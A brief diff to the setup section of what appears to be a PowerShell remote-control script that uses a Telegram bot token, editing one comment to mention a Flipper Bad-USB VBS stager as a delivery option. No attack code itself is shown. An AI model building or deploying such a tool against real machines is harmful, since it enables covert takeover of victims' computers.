@@ -13,7 +13,7 @@ SEE README FOR MORE INFO
 #>
 #---------------------------------------------- SCRIPT SETUP -----------------------------------------------
 # Define User Variables
-$Token = "$tg"  # REPLACE $tg WITH YOUR TELEGRAM BOT API TOKEN!
+$Token = "$tg"  # REPLACE $tg WITH YOUR TELEGRAM BOT API TOKEN! (unless using a stager e.g .VBS file of Flipper Bad-USB)
 #-----------------------------------------------------------------------------------------------------------
 
 # Define Connection Variables
